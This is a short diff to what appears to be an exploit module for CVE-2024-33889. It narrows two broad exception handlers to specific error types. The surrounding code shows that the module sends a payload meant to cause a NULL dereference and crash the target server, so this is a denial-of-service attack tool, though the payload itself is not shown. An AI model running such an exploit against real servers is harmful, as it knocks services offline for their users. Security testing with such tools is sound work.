@@ -93,7 +93,7 @@ class Exploit(Exploit):
             resp = s.recv(32)
             s.close()
             return resp[:3] == b"ACK"
-        except Exception:
+        except (ConnectionError, TimeoutError, OSError):
             return False
 
     def run(self):
@@ -143,5 +143,5 @@ class Exploit(Exploit):
                 print_success("[CVE-2024-33889] Connection reset - NULL deref triggered, server crashed!")
             except TimeoutError:
                 print_success("[CVE-2024-33889] Timeout - server unresponsive after payload - crash likely!")
-        except Exception as e:
+        except (ConnectionError, TimeoutError, ImportError, OSError) as e:
             print_error(f"[CVE-2024-33889] {e}")
